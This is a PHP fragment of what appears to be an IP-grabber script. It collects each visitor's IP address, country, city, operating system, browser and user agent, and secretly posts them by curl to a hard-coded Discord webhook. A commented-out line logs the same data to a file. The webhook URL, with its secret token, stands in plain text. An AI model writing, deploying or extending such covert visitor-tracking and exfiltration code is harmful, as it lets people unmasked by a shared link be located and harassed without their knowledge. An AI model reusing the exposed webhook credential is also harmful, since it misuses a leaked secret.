...
// $myfile = file_put_contents('iploggerip.txt',date("Y-m-d - H:i:s - "). $country. " ". $ip." | ". $user_os. " | ". $user_browser. " | Come from site :". $site. " | user agent:" .$user_agent .PHP_EOL , FILE_APPEND | LOCK_EX);
//fclose($myfile);


$curl = curl_init("https://discordapp.com/api/webhooks/592942304038486035/bJT1zuk6eBcwGO7XyqV6haT1Gb9V_XngFfnTfRqi8TW6Atc8NFhlVEa0MVeJhEiYlfmj"); //<------------ Webhook
curl_setopt($curl, CURLOPT_POST, 1);
curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode(array("content" => "$ip | $country | $city | $user_os | $user_browser | $user_agent\n")));
